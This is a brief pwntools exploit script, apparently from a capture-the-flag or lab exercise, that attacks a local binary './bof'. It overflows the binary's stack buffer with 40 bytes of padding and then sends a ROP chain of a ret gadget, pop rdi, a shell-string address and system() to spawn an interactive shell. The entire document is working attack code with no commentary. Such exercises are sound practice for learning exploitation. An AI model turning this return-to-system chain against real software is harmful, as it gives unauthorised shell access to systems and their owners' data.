from pwn import *

r = process("./bof")
pause()

RET = 0x0000000000400486
SHELL = 0x00000000004006a4
SYSTEM = 0x4004b0
POP_RDI_RET = 0x0000000000400683

PAYLOAD = b"A" * 40
PAYLOAD += p64(RET) + p64(POP_RDI_RET) + p64(SHELL) + p64(SYSTEM)
r.sendline(PAYLOAD)

r.interactive()
